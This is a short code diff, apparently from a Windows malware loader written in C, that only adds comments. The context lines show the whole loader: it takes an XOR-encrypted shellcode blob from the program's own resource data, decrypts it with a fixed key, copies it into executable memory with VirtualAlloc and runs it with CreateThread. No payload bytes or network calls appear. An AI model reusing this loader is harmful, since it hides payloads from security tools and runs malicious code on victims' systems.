@@ -47,6 +47,7 @@ void extractAndExecShellcode(HMODULE hModule){
         return;
     }
 
+    // Find shellcode
     LPBYTE enc_shellcode = (LPBYTE)pResData + (resSize - SHELLCODE_LEN);
 
     LPCSTR key = ENCRYPTION_KEY;
@@ -56,6 +57,7 @@ void extractAndExecShellcode(HMODULE hModule){
         shellcode[i]  = enc_shellcode[i] ^ key[i % strlen(key)];
     }
 
+    // Allocate + copy into memory
     LPVOID virtualMemory = VirtualAlloc(NULL, SHELLCODE_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(!virtualMemory){
         printf("Failed to allocate memory. Error: %u\n", GetLastError());
@@ -64,6 +66,7 @@ void extractAndExecShellcode(HMODULE hModule){
 
     RtlCopyMemory(virtualMemory, shellcode, SHELLCODE_LEN);
 
+    //Start thread
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)virtualMemory, NULL, 0, NULL);
     if(hThread == NULL){
         printf("Failed to start thread. Error: %u\n", GetLastError());
@@ -78,6 +81,7 @@ void extractAndExecShellcode(HMODULE hModule){
 }
 
 int main(int argc, char **argv){
+    // Geting process instance
     HMODULE hModule = GetModuleHandle(NULL);
     if(!hModule){
         printf("Failed to get module handle. Error: %u\n", GetLastError());
